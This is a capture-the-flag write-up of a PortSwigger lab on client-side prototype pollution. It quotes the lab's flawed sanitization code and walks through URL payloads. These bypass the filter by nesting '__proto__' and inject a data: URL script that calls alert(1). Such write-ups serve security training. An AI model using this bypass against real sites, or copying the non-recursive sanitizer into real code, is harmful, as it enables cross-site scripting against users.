---
title: PortSwigger - Client-side prototype pollution via flawed sanitization
date: 2025-04-13 09:59:00 -5000
categories: [CTF]
tags: [ctf, web, prototype pollution]     # TAG names should always be lowercase
---


This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.

To solve the lab:
1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call `alert()`.

![](/assets/portswigger/client-side-prototype-pollution-via-flawed-sanitization/0.png)
*Website Landing Page*

<br/>

When looking for Prototype pollution, we need find some logic that that:
1. Parses user supplied JSON
2. Constructs a JavaScript object in a way that prototype pollution can be introduced. This is usually through a merge function like so:

```jsx
for(var attr in source) {
        if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
```

3. The user controlled object needs to end up in an XSS sink.

<br/>

# Finding a Sink

I prefer to search for the sinks in the application and then work my way backwards to see if that source is controllable. When searching through the JavaScript code, the following code block stood out in the `searchLoggerFiltered.js` file.

```jsx
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}

window.addEventListener("load", searchLogger);
```

There is a `sink` in `script.src = config.transport_url`. If we are able to control `config.transport_url` then we can get XSS.

<br/>

# Finding the Source

Now that we have the sink, lets work our way backwards to find where the `config.transport_url` is coming from. The `config` value is being set just above with the following code:

```jsx
let config = {params: deparam(new URL(location).searchParams.toString())};
```

<br/>

The `config` object appears to have a key of `params` which has a value from the result of the `deparam()` function which takes the `URLSearchParams` as a parameter. 

```jsx
location.href = "https://example.com/page?name=Josh&age=30"

new URL(location).searchParams.toString()
// returns: "name=Josh&age=30"
```
*This is how the `searchParams` function operates*

<br/>

The `config` only has a `params` key, and we need a `transport_url` key in order to trigger the XSS. 

<br/>

# Debugging

The `deparam` function is quite complex and long so I will use chrome debugging tools along with some payloads to see if prototype pollution is possible.

```jsx
var deparam = function( params, coerce ) {
    var obj = {},
        coerce_types = { 'true': !0, 'false': !1, 'null': null };

    if (!params) {
        return obj;
    }

    params.replace(/\+/g, ' ').split('&').forEach(function(v){
        var param = v.split( '=' ),
            key = decodeURIComponent( param[0] ),
            val,
            cur = obj,
            i = 0,

            keys = key.split( '][' ),
            keys_last = keys.length - 1;

        if ( /\[/.test( keys[0] ) && /\]$/.test( keys[ keys_last ] ) ) {
            keys[ keys_last ] = keys[ keys_last ].replace( /\]$/, '' );

            keys = keys.shift().split('[').concat( keys );

            keys_last = keys.length - 1;
        } else {
            keys_last = 0;
        }

        if ( param.length === 2 ) {
            val = decodeURIComponent( param[1] );

            if ( coerce ) {
                val = val && !isNaN(val) && ((+val + '') === val) ? +val        // number
                    : val === 'undefined'                       ? undefined         // undefined
                        : coerce_types[val] !== undefined           ? coerce_types[val] // true, false, null
                            : val;                                                          // string
            }

            if ( keys_last ) {
                for ( ; i <= keys_last; i++ ) {
                    key = keys[i] === '' ? cur.length : keys[i];
                    cur = cur[sanitizeKey(key)] = i < keys_last
                        ? cur[sanitizeKey(key)] || ( keys[i+1] && isNaN( keys[i+1] ) ? {} : [] )
                        : val;
                }

            } else {
                if ( Object.prototype.toString.call( obj[key] ) === '[object Array]' ) {
                    obj[sanitizeKey(key)].push( val );

                } else if ( {}.hasOwnProperty.call(obj, key) ) {
                    obj[sanitizeKey(key)] = [ obj[key], val ];

                } else {
                    obj[sanitizeKey(key)] = val;
                }
            }

        } else if ( key ) {
            obj[key] = coerce
                ? undefined
                : '';
        }
    });

    return obj;
};
```

<br/>

Sending the following payload:

```jsx
https://web-security-academy.net/?__proto__[transport_url]=test
```

![](/assets/portswigger/client-side-prototype-pollution-via-flawed-sanitization/1.png)
*You can see that the JSON object is not what we want*

<br/>

Our goal is to have the JSON Object in the form:

```jsx
config = {
	params: "",
	__proto__: {
		transport_url : "data:text/javascript,alert(1)"
	}
}
```

<br/>

Since that didn’t work, lets try dot notation.

```jsx
https://web-security-academy.net/?__proto__.transport_url=test
```

![](/assets/portswigger/client-side-prototype-pollution-via-flawed-sanitization/2.png)
*You can see that the JSON object is not what we want*

<br/>

In both of these requests that `__proto__` is being stripped. We can try sending a payload that can bypass `__proto__` sanitization if there is no recursive sanitization.
```jsx
https://web-security-academy.net/?__pro__proto__to__.transport_url=test
```

![](/assets/portswigger/client-side-prototype-pollution-via-flawed-sanitization/3.png)
*`__proto__` is now present, but not in expected form*

<br/>

Lets go back to using object notation.

```jsx
https://web-security-academy.net/?__pro__proto__to__[transport_url]=test
```

![](/assets/portswigger/client-side-prototype-pollution-via-flawed-sanitization/4.png)
*Prototype is now polluted*

<br/>

# Prototype Pollution

Now that we are able to pollute the prototype, we can be XSS with the following payload:

```jsx
https://web-security-academy.net/?__pro__proto__to__[transport_url]=data:text/javascript,alert(1)
```

![](/assets/portswigger/client-side-prototype-pollution-via-flawed-sanitization/5.png)
